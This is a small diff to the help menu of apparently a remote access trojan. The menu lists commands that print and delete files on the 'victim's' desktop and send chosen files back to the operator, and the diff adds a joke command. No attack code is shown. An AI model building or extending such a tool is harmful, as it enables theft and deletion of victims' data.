@@ -46,6 +46,7 @@ DeleteFiles-Desktop     - Prints the contents of the victim's desktop and
 SendFiles-Desktop       - Prints the contents of the victim's desktop and 
                           ask for the name of the file to be sent over 
                           to your computer (currently works with .txt files)
+maytheforcebewithyou    - ඞ
 
 terminate               - Close the connection and the program
 ====================================================================
